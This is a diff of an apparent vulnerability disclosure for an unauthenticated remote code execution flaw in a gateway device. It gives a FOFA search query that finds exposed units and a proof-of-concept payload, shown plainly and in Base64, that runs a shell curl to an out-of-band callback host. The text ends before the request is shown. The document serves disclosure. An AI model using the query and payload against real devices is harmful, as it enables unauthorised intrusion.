@@ -3,14 +3,15 @@ Unauthenticated Remote Code Execution (RCE) in Shengxingzhe Gateway
 Summary 
 Asset search: https://fofa.info/
 
-FOFA：“cert.sn="9371290284317297864" &&title="网关”
+FOFA：cert.sn="9371290284317297864" && title=="统一认证网关"
 
 
 <img width="415" height="240" alt="image" src="https://github.com/user-attachments/assets/c28a17c1-5641-4214-b49e-a426cee27098" />
 
 A critical unauthenticated remote code execution (RCE) vulnerability exists in the Shenxingzhe gateway manufactured by Changsha Tongxun Computer Technology Co., Ltd. An attacker can execute arbitrary system commands on the device without authentication. 
 Description 
-<img width="1150" height="642" alt="image" src="https://github.com/user-attachments/assets/49720332-125a-44a6-8be3-9682db502029" />
+<img width="1242" height="1222" alt="image" src="https://github.com/user-attachments/assets/ffb70c02-f84a-4106-bc8c-14b891198ce2" />
+
 The gateway's web management interface (as shown in the attached image) has a design flaw in its backend logic. A specific function accepts Python code via the sUserCode parameter and executes it. An attacker can craft a request containing malicious code, bypassing authentication, and execute system commands directly on the server. 
 Proof of Concept (PoC) 
 
@@ -27,8 +28,8 @@ import('os').system('curl njaexqxtvfe3h9v3k5jlaei2y14ksbg0.oastify.com')
 The Base64 encoded string is: 
  
 eydzVXNlckNvZGU6J2ltcG9ydCgnc29zJykuc3lzdGVtKCdjdXJsIG5qYWV4cXh0dmZlM2g5djNrNWpsYWVpMnl1NGtzYmcwLm9hc3RpZnkuY29tJyk=
- 
-<img width="1664" height="1274" alt="image" src="https://github.com/user-attachments/assets/17fb4996-d12a-4a5c-bcb9-e9d42b0b44fd" />
+ <img width="832" height="288" alt="image" src="https://github.com/user-attachments/assets/8de9041a-1d03-41e4-b22b-fc401f540240" />
+
 
 
 Send the Request:
